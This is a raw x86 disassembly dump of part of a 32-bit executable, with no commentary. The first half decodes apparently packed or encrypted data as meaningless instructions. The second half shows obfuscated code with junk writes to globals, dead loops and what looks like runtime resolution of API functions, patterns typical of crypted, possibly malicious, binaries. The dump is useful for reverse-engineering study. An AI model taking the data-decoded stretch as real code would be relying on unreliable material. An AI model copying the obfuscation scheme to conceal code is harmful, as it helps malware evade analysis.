  41bd01:	inc    esp
  41bd02:	push   esp
  41bd03:	imul   edi,DWORD PTR [edi+0x5e],0xffffff82
  41bd07:	ret    
  41bd08:	in     eax,0xf
  41bd0a:	sti    
  41bd0b:	inc    ebx
  41bd0c:	sub    eax,0xddc932cc
  41bd11:	sbb    edi,DWORD PTR [ecx-0x37]
  41bd14:	mov    ah,0x7
  41bd16:	mov    eax,ds:0x6e4ff2c7
  41bd1b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bd1c:	pop    ebx
  41bd1d:	push   ecx
  41bd1e:	imul   edi,DWORD PTR [ebp-0x5f],0xffffffa1
  41bd22:	rcr    DWORD PTR [eax],cl
  41bd24:	inc    edx
  41bd25:	pop    eax
  41bd26:	div    DWORD PTR [ecx+0x39afea8c]
  41bd2c:	cld    
  41bd2d:	or     eax,0x7c04420d
  41bd32:	pop    es
  41bd33:	push   edx
  41bd34:	bnd ret 
  41bd36:	pusha  
  41bd37:	lahf   
  41bd38:	and    al,0x5d
  41bd3a:	daa    
  41bd3b:	stos   DWORD PTR es:[edi],eax
  41bd3c:	in     eax,dx
  41bd3d:	cmp    al,0x9e
  41bd3f:	gs jae 0x41bd7d
  41bd42:	lock mov bl,BYTE PTR [ebx-0x6d]
  41bd46:	lods   al,BYTE PTR ds:[esi]
  41bd47:	adc    esp,DWORD PTR [ebx-0x1e9cf953]
  41bd4d:	arpl   WORD PTR [ecx-0x19],dx
  41bd50:	pop    ss
  41bd51:	inc    eax
  41bd52:	(bad)  
  41bd53:	sti    
  41bd54:	lods   al,BYTE PTR ds:[esi]
  41bd55:	sar    BYTE PTR [esi],1
  41bd57:	dec    edx
  41bd58:	int    0xf0
  41bd5a:	arpl   WORD PTR [ebx-0x76aeb070],ax
  41bd60:	lds    eax,FWORD PTR [ebx-0x47]
  41bd63:	sti    
  41bd64:	sub    ebp,ecx
  41bd66:	jmp    0xd68d29d3
  41bd6b:	das    
  41bd6c:	cmc    
  41bd6d:	test   DWORD PTR [edx-0x3a],ebp
  41bd70:	sub    dh,BYTE PTR [edx+0x6c]
  41bd73:	and    BYTE PTR ss:[eax-0x712b4713],al
  41bd7a:	adc    BYTE PTR [esi-0x53],bh
  41bd7d:	(bad)  
  41bd7e:	push   edx
  41bd7f:	lods   al,BYTE PTR ds:[esi]
  41bd80:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bd81:	mov    dh,0x98
  41bd83:	scas   eax,DWORD PTR es:[edi]
  41bd84:	and    al,0xe7
  41bd86:	cwde   
  41bd87:	jg     0x41bdc2
  41bd89:	push   0xc07a112a
  41bd8e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bd8f:	not    BYTE PTR [ebx+0x54]
  41bd92:	mov    al,BYTE PTR [ebx-0x4f]
  41bd95:	imul   esi,edi,0xffffffc5
  41bd98:	repnz movs DWORD PTR es:[di],DWORD PTR ds:[si]
  41bd9b:	add    edx,DWORD PTR [edx-0x42]
  41bd9e:	loopne 0x41bd65
  41bda0:	or     al,0x40
  41bda2:	call   0x4cadf8da
  41bda7:	mov    al,ah
  41bda9:	xchg   DWORD PTR [ecx-0x11],edi
  41bdac:	lahf   
  41bdad:	data16 mov al,ds:0xd36f116f
  41bdb3:	daa    
  41bdb4:	pop    ds
  41bdb5:	push   esi
  41bdb6:	in     eax,0x2b
  41bdb8:	adc    edx,DWORD PTR [edx-0x67]
  41bdbb:	fstp   DWORD PTR [eax]
  41bdbd:	loopne 0x41bdcc
  41bdbf:	or     bh,BYTE PTR [edx-0x58]
  41bdc2:	mov    esi,edx
  41bdc4:	mov    cl,0x76
  41bdc6:	push   esp
  41bdc7:	inc    edi
  41bdc8:	fs out 0x2f,al
  41bdcb:	push   esi
  41bdcc:	pop    ebp
  41bdcd:	aaa    
  41bdce:	xor    BYTE PTR [ecx+0x65194a48],bl
  41bdd4:	push   0xffffffa0
  41bdd6:	and    BYTE PTR [eiz*2-0x5c61ba79],0xe7
  41bdde:	js     0x41bd84
  41bde0:	aad    0xb1
  41bde2:	scas   al,BYTE PTR es:[edi]
  41bde3:	jbe    0x41bdf0
  41bde5:	sti    
  41bde6:	sub    eax,0x8a59fc44
  41bdeb:	mov    BYTE PTR [eax+0x33],bl
  41bdee:	mov    fs,WORD PTR [eax+0x2d]
  41bdf1:	cli    
  41bdf2:	retf   0xd618
  41bdf5:	popa   
  41bdf6:	add    al,0x19
  41bdf8:	push   ecx
  41bdf9:	leave  
  41bdfa:	mov    ds:0xf94de226,al
  41bdff:	aas    
  41be00:	xchg   BYTE PTR [ebx+ecx*4+0x3386393b],ch
  41be07:	ins    BYTE PTR es:[edi],dx
  41be08:	jp     0x41be4a
  41be0a:	fwait
  41be0b:	neg    DWORD PTR [esi+0x33]
  41be0e:	adc    eax,0x66c883e5
  41be13:	sbb    ebp,DWORD PTR [esi-0xc]
  41be16:	dec    edx
  41be17:	sar    BYTE PTR [eax-0x55390d6],0xc1
  41be1e:	aaa    
  41be1f:	mov    edx,0x6a7082a4
  41be24:	fidiv  DWORD PTR ss:[edx]
  41be27:	test   eax,0x3a948e1f
  41be2c:	mov    bl,0x82
  41be2e:	push   edx
  41be2f:	mov    bl,0x2
  41be31:	in     eax,dx
  41be32:	mov    al,0x10
  41be34:	ds adc cl,bl
  41be37:	mov    eax,0xd0bfd63d
  41be3c:	jne    0x41be6a
  41be3e:	je     0x41bdc5
  41be40:	sub    al,0xbf
  41be42:	mov    ds:0x657012e,al
  41be47:	shr    BYTE PTR [ebp+edi*8-0x54],1
  41be4b:	pop    ss
  41be4c:	pop    ebx
  41be4d:	add    edi,ebx
  41be4f:	cli    
  41be50:	in     eax,0x73
  41be52:	cmp    DWORD PTR [edi+0x252e1b5],edx
  41be58:	aam    0xd2
  41be5a:	jns    0x41be3d
  41be5c:	push   ds
  41be5d:	outs   dx,DWORD PTR ds:[esi]
  41be5e:	adc    BYTE PTR [ebx-0x600697c9],0xe2
  41be65:	lahf   
  41be66:	xor    BYTE PTR [edx+0x14670350],ah
  41be6c:	jnp    0x41be3b
  41be6e:	test   DWORD PTR [ecx-0x35fa6c55],esi
  41be74:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41be75:	jne    0x41be8d
  41be77:	or     esp,ecx
  41be79:	cli    
  41be7a:	cli    
  41be7b:	lea    edi,[eax]
  41be7d:	imul   esp,DWORD PTR [eax+0x36],0xffffffaa
  41be81:	mov    bh,BYTE PTR [esi+esi*4]
  41be84:	(bad)  [ebx]
  41be86:	test   BYTE PTR [esi-0x164ed672],bl
  41be8c:	out    0xed,eax
  41be8e:	pop    ss
  41be8f:	mov    eax,ds:0xaa29d42d
  41be94:	adc    esp,DWORD PTR [eax]
  41be96:	clc    
  41be97:	sub    DWORD PTR [edx+0x14b5754e],esi
  41be9d:	sbb    BYTE PTR [ebp+0x6],bh
  41bea0:	xor    ecx,0x5f11628c
  41bea6:	sub    BYTE PTR [ebx-0x63],bl
  41bea9:	cmp    eax,0xe1a6a638
  41beae:	lods   al,BYTE PTR ds:[esi]
  41beaf:	aas    
  41beb0:	mov    esp,0xad2a55c2
  41beb5:	add    DWORD PTR [ebp-0x1b],ecx
  41beb8:	les    edx,FWORD PTR [ebp-0x7b]
  41bebb:	mov    dl,0x5a
  41bebd:	inc    esi
  41bebe:	sbb    BYTE PTR [ebp+0x43f38be3],0x74
  41bec5:	push   es
  41bec6:	cwde   
  41bec7:	sub    DWORD PTR [ebp+eiz*2-0x3545b40b],edi
  41bece:	scas   eax,DWORD PTR es:[edi]
  41becf:	xchg   esi,eax
  41bed0:	inc    edi
  41bed1:	test   al,0x2f
  41bed3:	repnz or edx,edi
  41bed6:	xlat   BYTE PTR ds:[ebx]
  41bed7:	dec    esi
  41bed8:	mov    ah,0x1d
  41beda:	aam    0xa5
  41bedc:	sti    
  41bedd:	out    0x33,al
  41bedf:	test   DWORD PTR [edx],ebx
  41bee1:	rcl    BYTE PTR [esi+0x20],0x94
  41bee5:	clc    
  41bee6:	outs   dx,BYTE PTR ds:[esi]
  41bee7:	mov    DWORD PTR [esi-0x7bbbc219],ebx
  41beed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41beee:	push   esp
  41beef:	dec    edi
  41bef0:	cmp    eax,0xc9279c31
  41bef5:	sbb    edx,DWORD PTR [edi+ebx*4-0x42]
  41bef9:	ds enter 0x6301,0xdd
  41befe:	scas   eax,DWORD PTR es:[edi]
  41beff:	add    eax,0xa8b7a51c
  41bf04:	mov    ebx,fs
  41bf06:	xchg   edi,eax
  41bf07:	imul   esi,DWORD PTR [edi+esi*1-0x2f],0xa
  41bf0c:	rol    BYTE PTR [edx+0x23],cl
  41bf0f:	xchg   dh,bl
  41bf11:	mov    DWORD PTR [esi+0x6ecea6d2],ebx
  41bf17:	ja     0x41bf01
  41bf19:	push   ss
  41bf1a:	addr16 out 0x21,eax
  41bf1d:	sub    BYTE PTR [esi-0x5ef222],ch
  41bf23:	sar    DWORD PTR [esi+eax*8-0x17],1
  41bf27:	jge    0x41bf68
  41bf29:	arpl   bp,dx
  41bf2b:	cmp    ah,bl
  41bf2d:	pop    esp
  41bf2e:	fld    TBYTE PTR [eax-0xc]
  41bf31:	fiadd  WORD PTR [edi+0x687da5d3]
  41bf37:	sbb    ebp,edx
  41bf39:	stos   BYTE PTR es:[edi],al
  41bf3a:	mov    edx,0xde0eae03
  41bf3f:	int    0x57
  41bf41:	popa   
  41bf42:	leave  
  41bf43:	cmp    BYTE PTR [esi],ah
  41bf45:	int3   
  41bf46:	pushf  
  41bf47:	mov    WORD PTR ds:0x4a9b8ace,cs
  41bf4d:	setnp  BYTE PTR [ebx+edx*4]
  41bf51:	pop    ebp
  41bf52:	push   edi
  41bf53:	fwait
  41bf54:	stos   DWORD PTR es:[edi],eax
  41bf55:	adc    ecx,DWORD PTR [edx]
  41bf57:	push   0x70
  41bf59:	daa    
  41bf5a:	ror    edi,1
  41bf5c:	mul    BYTE PTR [edi+0x31518cd7]
  41bf62:	mov    DWORD PTR [esi+0x6d914f2a],esp
  41bf68:	rol    DWORD PTR [edi-0x78],cl
  41bf6b:	mov    bh,0x40
  41bf6d:	loopne 0x41bf3c
  41bf6f:	mov    eax,0xc23117d2
  41bf74:	stos   BYTE PTR es:[edi],al
  41bf75:	xor    al,0xe8
  41bf77:	mov    cl,0xa
  41bf79:	cmp    eax,0xb5087ae1
  41bf7e:	in     eax,0xca
  41bf80:	cld    
  41bf81:	addr16 push eax
  41bf83:	(bad)  
  41bf84:	or     BYTE PTR [esi-0x68],bl
  41bf87:	push   edi
  41bf88:	imul   esi,DWORD PTR [eax],0xffffffb0
  41bf8b:	sbb    ecx,DWORD PTR [esp+ebp*2+0x24]
  41bf8f:	sbb    cl,BYTE PTR [edi]
  41bf91:	sbb    cl,bl
  41bf93:	stos   DWORD PTR es:[edi],eax
  41bf94:	lock sbb dh,ch
  41bf97:	je     0x41bf9a
  41bf99:	retf   0xcad8
  41bf9c:	or     DWORD PTR [edx+0xc9bb51a],ebp
  41bfa2:	nop
  41bfa3:	ret    
  41bfa4:	sbb    DWORD PTR [ecx],0x98f497c1
  41bfaa:	xlat   BYTE PTR ds:[ebx]
  41bfab:	dec    edx
  41bfac:	add    eax,0x1f294c18
  41bfb1:	pop    es
  41bfb2:	ins    DWORD PTR es:[edi],dx
  41bfb3:	sti    
  41bfb4:	mov    gs,WORD PTR [eax]
  41bfb6:	jo     0x41c019
  41bfb8:	mov    BYTE PTR [edx],al
  41bfba:	ins    DWORD PTR es:[edi],dx
  41bfbb:	cmp    eax,0xc5a740c3
  41bfc0:	mov    eax,0x94414c7d
  41bfc5:	loopne 0x41bfba
  41bfc7:	aad    0xb2
  41bfc9:	cmp    ch,ch
  41bfcb:	not    BYTE PTR [ebx+0x62d75216]
  41bfd1:	shl    eax,0xd3
  41bfd4:	pop    eax
  41bfd5:	(bad)  
  41bfd6:	(bad)  
  41bfd7:	sar    BYTE PTR [ebp+0x3],0x51
  41bfdb:	pshufw mm6,mm6,0xa
  41bfdf:	sbb    ebx,eax
  41bfe1:	sbb    eax,0x13615a58
  41bfe6:	shr    ah,1
  41bfe8:	inc    ebp
  41bfe9:	adc    WORD PTR [eax+0x3e],ax
  41bfed:	mov    ch,0x45
  41bfef:	push   0x15
  41bff1:	push   0xffffff92
  41bff3:	pop    eax
  41bff4:	jno    0x41bfe2
  41bff6:	fs mov edi,0x23f4cc0b
  41bffc:	mov    ebx,0x9c0f9522
  41c001:	mov    al,0x21
  41c003:	pop    es
  41c004:	pop    ebx
  41c005:	(bad)  
  41c006:	loopne 0x41c036
  41c008:	hlt    
  41c009:	cmp    DWORD PTR [eax+0x17],0xd5ee3ed6
  41c010:	in     al,0x37
  41c012:	in     eax,dx
  41c013:	repnz fimul DWORD PTR [eax]
  41c016:	cs pop esp
  41c018:	ret    
  41c019:	lahf   
  41c01a:	push   cs
  41c01b:	test   eax,0x8da98fb5
  41c020:	adc    ebp,eax
  41c022:	xchg   esp,eax
  41c023:	in     al,0xe3
  41c025:	push   cs
  41c026:	or     BYTE PTR [ecx+0x75],0x69
  41c02a:	ror    bh,cl
  41c02c:	sar    BYTE PTR [ecx],cl
  41c02e:	mov    ds:0x939c1742,eax
  41c033:	sbb    BYTE PTR [esi-0x48a85bc4],dh
  41c039:	clc    
  41c03a:	jb     0x41bfd3
  41c03c:	pop    eax
  41c03d:	mov    eax,0x2fb46d0b
  41c042:	and    eax,0x34e42ca0
  41c047:	mov    dl,BYTE PTR ss:[edi+0x75]
  41c04b:	xor    DWORD PTR [ecx-0x753d14a4],0xb52a9c1b
  41c055:	into   
  41c056:	fidivr WORD PTR [esi-0x3dc91769]
  41c05c:	stos   DWORD PTR es:[edi],eax
  41c05d:	pop    ds
  41c05e:	pop    edx
  41c05f:	mov    cl,0x1c
  41c061:	rol    BYTE PTR ds:0xae964262,0x1a
  41c068:	pushf  
  41c069:	adc    DWORD PTR ds:0x2032f310,ebp
  41c06f:	lods   al,BYTE PTR ds:[esi]
  41c070:	repnz imul ebp,DWORD PTR [si],0x2529ca93
  41c078:	and    edi,edi
  41c07a:	or     al,0xba
  41c07c:	jo     0x41c0f7
  41c07e:	sbb    DWORD PTR [ebp+esi*4-0x75],edi
  41c082:	fcomp  QWORD PTR [edx-0x5ab96e75]
  41c088:	jge    0x41c02b
  41c08a:	test   BYTE PTR [ebp-0x1b599ad4],al
  41c090:	loop   0x41c0b4
  41c092:	enter  0xc048,0xf7
  41c096:	das    
  41c097:	push   ds
  41c098:	mov    cl,0xf2
  41c09a:	xchg   ebx,eax
  41c09b:	jmp    FWORD PTR ds:[edi-0x7c]
  41c09f:	or     al,0x37
  41c0a1:	popf   
  41c0a2:	addr16 aad 0x90
  41c0a5:	jns    0x41c047
  41c0a7:	xchg   edi,eax
  41c0a8:	and    DWORD PTR [ebp+edi*8+0x3971d7ad],edi
  41c0af:	pop    ebx
  41c0b0:	popf   
  41c0b1:	mov    eax,0x4e5cf678
  41c0b6:	das    
  41c0b7:	mov    dh,BYTE PTR [ebx+0x39]
  41c0ba:	fmul   QWORD PTR [ebx+ebx*8-0x1b]
  41c0be:	ins    DWORD PTR es:[edi],dx
  41c0bf:	sbb    BYTE PTR [edi],dh
  41c0c1:	push   cs
  41c0c2:	add    eax,0x87b0ed2f
  41c0c7:	and    DWORD PTR [eax],esi
  41c0c9:	inc    edx
  41c0ca:	jl     0x41c12b
  41c0cc:	xchg   al,ch
  41c0ce:	sbb    eax,0xda416557
  41c0d3:	(bad)  
  41c0d4:	push   ds
  41c0d5:	adc    eax,0x90d8175a
  41c0da:	out    0xbe,al
  41c0dc:	mov    edx,0xe7657f86
  41c0e1:	mov    ebp,0x2d9efa97
  41c0e6:	jno    0x41c0eb
  41c0e8:	or     edx,DWORD PTR [ecx]
  41c0ea:	fs js  0x41c15c
  41c0ed:	push   esp
  41c0ee:	retf   0x2bc0
  41c0f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c0f2:	fistp  QWORD PTR [ebx-0x2525efa1]
  41c0f8:	fbstp  TBYTE PTR [esi]
  41c0fa:	inc    ebp
  41c0fb:	sub    DWORD PTR [ecx],edi
  41c0fd:	jbe    0x41c08a
  41c0ff:	dec    ebp
  41c100:	call   0xcf7dbb08
  41c105:	je     0x41c147
  41c10b:	mov    ecx,DWORD PTR [ebp-0x18]
  41c10e:	add    ecx,eax
  41c110:	mov    DWORD PTR [ebp-0x1c],ecx
  41c113:	mov    ecx,DWORD PTR [ebp-0x30]
  41c116:	mov    edx,DWORD PTR [ebp-0x2c]
  41c119:	mov    edx,0xa147
  41c11e:	xor    cx,dx
  41c121:	mov    edx,DWORD PTR [ebp-0x1c]
  41c124:	mov    edx,DWORD PTR [edx+0xc]
  41c127:	add    cx,si
  41c12a:	cmp    WORD PTR [eax+edx*1],cx
  41c12e:	jne    0x41c147
  41c134:	mov    ecx,DWORD PTR ds:0x4262c9
  41c13a:	mov    ecx,DWORD PTR [ecx+0x198]
  41c140:	mov    DWORD PTR [ecx],eax
  41c142:	jmp    0x41c1c5
  41c147:	push   DWORD PTR [ebp+0x1c]
  41c14a:	push   DWORD PTR [ebp+0x18]
  41c14d:	jmp    0x41c1b4
  41c152:	mov    eax,DWORD PTR [ebp+0x18]
  41c155:	mov    ecx,DWORD PTR [ebp+0x1c]
  41c158:	cmp    eax,0x70941f9e
  41c15d:	jne    0x41c176
  41c163:	cmp    ecx,ebx
  41c165:	jne    0x41c176
  41c16b:	push   ebx
  41c16c:	push   0x70941f9b
  41c171:	jmp    0x41c1b4
  41c176:	mov    ecx,DWORD PTR [ebp+0x18]
  41c179:	mov    edx,DWORD PTR [ebp+0x1c]
  41c17c:	mov    eax,0x70941f98
  41c181:	cmp    ecx,eax
  41c183:	jne    0x41c198
  41c189:	cmp    edx,ebx
  41c18b:	jne    0x41c198
  41c191:	push   ebx
  41c192:	push   edi
  41c193:	jmp    0x41c1b4
  41c198:	mov    ecx,DWORD PTR [ebp+0x18]
  41c19b:	mov    edx,DWORD PTR [ebp+0x1c]
  41c19e:	cmp    ecx,0x70941f9b
  41c1a4:	jne    0x41c1c5
  41c1aa:	cmp    edx,ebx
  41c1ac:	jne    0x41c1c5
  41c1b2:	push   ebx
  41c1b3:	push   eax
  41c1b4:	push   DWORD PTR [ebp+0x14]
  41c1b7:	push   DWORD PTR [ebp+0x10]
  41c1ba:	push   DWORD PTR [ebp+0xc]
  41c1bd:	push   DWORD PTR [ebp+0x8]
  41c1c0:	call   0x417355
  41c1c5:	pop    edi
  41c1c6:	pop    esi
  41c1c7:	pop    ebx
  41c1c8:	leave  
  41c1c9:	ret    0x18
  41c1cc:	push   ebp
  41c1cd:	mov    ebp,esp
  41c1cf:	and    esp,0xfffffff8
  41c1d2:	add    DWORD PTR ds:0x426f09,0x426ef5
  41c1dc:	mov    al,ds:0x4263ef
  41c1e1:	sub    esp,0x54
  41c1e4:	mov    DWORD PTR ds:0x426eb5,0x2e24
  41c1ee:	push   ebx
  41c1ef:	push   esi
  41c1f0:	push   edi
  41c1f1:	mov    DWORD PTR ds:0x426f15,0x7495
  41c1fb:	cmp    al,BYTE PTR ds:0x4263fa
  41c201:	mov    DWORD PTR ds:0x426ee9,0x194c
  41c20b:	je     0x41c22c
  41c211:	or     DWORD PTR ds:0x426eed,0x426ed5
  41c21b:	xor    eax,eax
  41c21d:	mov    DWORD PTR ds:0x426ee1,0xaaa
  41c227:	jmp    0x41d276
  41c22c:	mov    al,ds:0x42640c
  41c231:	cmp    al,BYTE PTR ds:0x42641b
  41c237:	mov    DWORD PTR ds:0x426ee9,0x1f8d
  41c241:	jne    0x41c211
  41c247:	neg    edi
  41c249:	mov    edi,DWORD PTR ds:0x42fa50
  41c24f:	and    DWORD PTR ds:0x426ee1,0x426e95
  41c259:	push   0x426425
  41c25e:	sbb    DWORD PTR ds:0x426f0d,0x426ed5
  41c268:	push   0x426435
  41c26d:	adc    DWORD PTR ds:0x426eed,0x426ed5
  41c277:	call   edi
  41c279:	test   eax,eax
  41c27b:	mov    DWORD PTR ds:0x426ee5,0x502f
  41c285:	je     0x41c211
  41c28b:	push   0x426449
  41c290:	and    DWORD PTR ds:0x426f1d,0x426ef1
  41c29a:	call   DWORD PTR ds:0x42fa34
  41c2a0:	mov    DWORD PTR [esp+0x44],0x0
  41c2a8:	mov    ecx,0xf89c85b5
  41c2ad:	mov    DWORD PTR [esp+0x10],ecx
  41c2b1:	mov    DWORD PTR ds:0x426edd,0x1a
  41c2bb:	cmp    DWORD PTR ds:0x426edd,0x0
  41c2c2:	je     0x41c31b
  41c2c8:	cmp    DWORD PTR ds:0x426edd,0x7
  41c2cf:	jle    0x41c31b
  41c2d5:	jmp    0x41c2ed
  41c2da:	push   DWORD PTR [ebp-0x20]
  41c2dd:	push   0x4e76
  41c2e2:	push   0x4592
  41c2e7:	call   DWORD PTR ds:0x42fa18
  41c2ed:	cmp    DWORD PTR ds:0x426edd,0x8
  41c2f4:	jne    0x41c309
  41c2fa:	xor    edx,edx
  41c2fc:	add    edx,DWORD PTR ds:0x426edd
  41c302:	dec    edx
  41c303:	mov    DWORD PTR ds:0x426edd,edx
  41c309:	mov    edx,DWORD PTR ds:0x426edd
  41c30f:	dec    edx
  41c310:	mov    DWORD PTR ds:0x426edd,edx
  41c316:	jmp    0x41c2bb
  41c31b:	mov    DWORD PTR [esp+0x1c],0xf89c85b4
  41c323:	lea    eax,[esp+0x34]
  41c327:	mov    DWORD PTR [esp+0x44],eax
  41c32b:	mov    esi,DWORD PTR ds:0x428e55
  41c331:	mov    ebx,DWORD PTR ds:0x42af09
  41c337:	sub    esi,ebx
  41c339:	sub    esi,DWORD PTR [esi+ebx*1]
  41c33c:	lea    eax,[esp+0x30]
  41c340:	mov    DWORD PTR [esp+0x28],eax
  41c344:	sub    DWORD PTR ds:0x426ea9,0x492f
  41c34e:	mov    eax,ds:0x4262c9
  41c353:	mov    edx,DWORD PTR ds:0x426ef9
  41c359:	sbb    DWORD PTR ds:0x426f05,edx
  41c35f:	mov    eax,DWORD PTR [eax+0x1c8]
  41c365:	mov    DWORD PTR ds:0x426f29,0x788d
  41c36f:	mov    eax,DWORD PTR [eax]
  41c371:	mov    edx,DWORD PTR [esp+0x28]
  41c375:	and    DWORD PTR ds:0x426efd,0x0
  41c37f:	jmp    0x41c393
  41c384:	xor    esi,esi
  41c386:	xor    esi,DWORD PTR ds:0x426efd
  41c38c:	inc    esi
  41c38d:	mov    DWORD PTR ds:0x426efd,esi
  41c393:	cmp    DWORD PTR ds:0x426efd,0x1a
  41c39a:	jae    0x41c3cb
  41c3a0:	cmp    DWORD PTR ds:0x426efd,0x1c
  41c3a7:	jge    0x41c3cb
  41c3ad:	jmp    0x41c3c6
  41c3b2:	push   DWORD PTR [ebp-0xc]
  41c3b5:	push   0x4c83
  41c3ba:	push   DWORD PTR [ebp-0x14]
  41c3bd:	push   DWORD PTR [ebp-0x1c]
  41c3c0:	call   DWORD PTR ds:0x42fa4c
  41c3c6:	jmp    0x41c384
  41c3cb:	mov    esi,0x75108b3
  41c3d0:	and    DWORD PTR ds:0x426e81,0x1564
  41c3da:	xor    eax,esi
  41c3dc:	mov    ebx,0x3272fa
  41c3e1:	add    eax,ebx
  41c3e3:	mov    DWORD PTR [edx],eax
  41c3e5:	mov    DWORD PTR ds:0x426ea1,0x7a67
  41c3ef:	mov    eax,ds:0x426d99
  41c3f4:	mov    DWORD PTR ds:0x426f1d,0x65da
  41c3fe:	cmp    eax,0x455dedfa
  41c403:	mov    DWORD PTR ds:0x426ea9,0x55fc
  41c40d:	jne    0x41c4f5
  41c413:	and    DWORD PTR ds:0x426ef5,0x0
  41c41d:	mov    eax,ds:0x426ef5
  41c422:	inc    eax
  41c423:	mov    ds:0x426ef5,eax
  41c428:	cmp    DWORD PTR ds:0x426ef5,0xd
  41c42f:	jl     0x41c479
  41c435:	jmp    0x41c454
  41c43a:	push   0x59de
  41c43f:	push   0x39ed
  41c444:	push   0x1b7c
  41c449:	push   0x44aa
  41c44e:	call   DWORD PTR ds:0x42fa1c
  41c454:	cmp    DWORD PTR ds:0x426ef5,0xc
  41c45b:	jne    0x41c46c
  41c461:	mov    eax,ds:0x426ef5
  41c466:	inc    eax
  41c467:	mov    ds:0x426ef5,eax
  41c46c:	cmp    DWORD PTR ds:0x426ef5,0x1f
  41c473:	jb     0x41c41d
  41c479:	mov    eax,DWORD PTR [esp+0x10]
  41c47d:	xor    edx,DWORD PTR ds:0x426ecd
  41c483:	mov    edx,DWORD PTR ds:0x4262c9
  41c489:	mov    edx,DWORD PTR [edx+0x198]
  41c48f:	add    DWORD PTR ds:0x426ec5,0x6b2
  41c499:	xor    eax,esi
  41c49b:	adc    DWORD PTR ds:0x426f25,0x426ef9
  41c4a5:	add    eax,ebx
  41c4a7:	and    DWORD PTR ds:0x426e85,0x426f15
  41c4b1:	mov    DWORD PTR [edx],eax
  41c4b3:	mov    eax,DWORD PTR [esp+0x10]
  41c4b7:	sub    DWORD PTR ds:0x426ec9,0x4e94
  41c4c1:	xor    eax,esi
  41c4c3:	add    eax,ebx
  41c4c5:	adc    DWORD PTR ds:0x426e81,0x426e91
  41c4cf:	mov    ds:0x426d99,eax
  41c4d4:	mov    eax,DWORD PTR [esp+0x10]
  41c4d8:	adc    DWORD PTR ds:0x426eed,0x426ef9
  41c4e2:	xor    eax,esi
  41c4e4:	add    eax,ebx
  41c4e6:	sub    DWORD PTR ds:0x426ea9,0x426e85
  41c4f0:	mov    ds:0x4263c1,eax
  41c4f5:	mov    eax,ds:0x4262c9
  41c4fa:	sbb    DWORD PTR ds:0x426f05,0x67a3
  41c504:	mov    eax,DWORD PTR [eax+0x18c]
  41c50a:	adc    DWORD PTR ds:0x426e91,0x180f
  41c514:	mov    eax,DWORD PTR [eax]
  41c516:	sbb    DWORD PTR ds:0x426eb1,0x4112
  41c520:	mov    DWORD PTR [esp+0x48],eax
  41c524:	adc    DWORD PTR ds:0x426eb9,edi
  41c52a:	mov    eax,0xf89c85b9
  41c52f:	mov    DWORD PTR [esp+0x38],eax
  41c533:	inc    DWORD PTR ds:0x426e8d
  41c539:	mov    DWORD PTR [esp+0x38],eax
  41c53d:	xor    DWORD PTR ds:0x426f11,0x441e
  41c547:	mov    DWORD PTR [esp+0x38],eax
  41c54b:	mov    DWORD PTR [esp+0x38],ecx
  41c54f:	neg    DWORD PTR ds:0x426f25
  41c555:	mov    DWORD PTR [esp+0x28],eax
  41c559:	movzx  eax,WORD PTR ds:0x426ec5
  41c560:	sbb    eax,DWORD PTR ds:0x426ee1
  41c566:	mov    ds:0x426ec5,eax
  41c56b:	mov    DWORD PTR [esp+0x28],0xf89c85bd
  41c573:	sbb    DWORD PTR ds:0x426ef9,0x58a6
  41c57d:	mov    eax,DWORD PTR [esp+0x10]
  41c581:	xor    eax,esi
  41c583:	add    eax,ebx
  41c585:	jmp    0x41c7a3
  41c58a:	mov    DWORD PTR ds:0x426eb5,0x6384
  41c594:	mov    al,ds:0x42647f
  41c599:	mov    DWORD PTR ds:0x426f01,0x6aa0
  41c5a3:	cmp    al,BYTE PTR ds:0x42648a
  41c5a9:	mov    DWORD PTR ds:0x426e85,0x34fb
  41c5b3:	jne    0x41c211
  41c5b9:	mov    DWORD PTR ds:0x426e99,0x7ac4
  41c5c3:	mov    al,ds:0x42649c
  41c5c8:	cmp    al,BYTE PTR ds:0x4264ab
  41c5ce:	mov    DWORD PTR ds:0x426e99,0x679f
  41c5d8:	jne    0x41c211
  41c5de:	push   0x4264b5
  41c5e3:	or     DWORD PTR ds:0x426e99,0x4d97
  41c5ed:	push   0x4264c5
  41c5f2:	call   edi
  41c5f4:	test   eax,eax
  41c5f6:	mov    DWORD PTR ds:0x426ecd,0x4160
  41c600:	je     0x41c211
  41c606:	mov    DWORD PTR ds:0x426ec5,0x29ef
  41c610:	mov    al,ds:0x4264db
  41c615:	cmp    al,BYTE PTR ds:0x4264e6
  41c61b:	jne    0x41c211
  41c621:	mov    al,ds:0x4264f8
  41c626:	mov    DWORD PTR ds:0x426ecd,0x6d7c
  41c630:	cmp    al,BYTE PTR ds:0x426507
  41c636:	mov    DWORD PTR ds:0x426ee5,0x7eb8
  41c640:	jne    0x41c211
  41c646:	sub    DWORD PTR ds:0x426ef9,0x282b
  41c650:	push   0x426511
  41c655:	push   0x426521
  41c65a:	call   edi
  41c65c:	sbb    DWORD PTR ds:0x426edd,0x426e9d
  41c666:	test   eax,eax
  41c668:	mov    DWORD PTR ds:0x426ee9,0x3f4b
  41c672:	je     0x41c211
  41c678:	and    DWORD PTR ds:0x426e91,0x0
  41c682:	xor    eax,eax
  41c684:	xor    eax,DWORD PTR ds:0x426e91
  41c68a:	inc    eax
  41c68b:	mov    ds:0x426e91,eax
  41c690:	cmp    DWORD PTR ds:0x426e91,0x9
  41c697:	ja     0x41c6d0
  41c69d:	jmp    0x41c6a8
  41c6a2:	call   DWORD PTR ds:0x42fa20
  41c6a8:	cmp    DWORD PTR ds:0x426e91,0x8
  41c6af:	jne    0x41c6c3
  41c6b5:	xor    eax,eax
  41c6b7:	add    eax,DWORD PTR ds:0x426e91
  41c6bd:	inc    eax
  41c6be:	mov    ds:0x426e91,eax
  41c6c3:	cmp    DWORD PTR ds:0x426e91,0x1a
  41c6ca:	jb     0x41c682
  41c6d0:	mov    eax,DWORD PTR [esp+0x1c]
  41c6d4:	adc    DWORD PTR ds:0x426f01,ecx
  41c6da:	mov    ecx,DWORD PTR [esp+0x28]
  41c6de:	xor    eax,esi
  41c6e0:	lea    eax,[eax+ecx*1+0x3272fa]
  41c6e7:	push   eax
  41c6e8:	xor    eax,DWORD PTR ds:0x426eb1
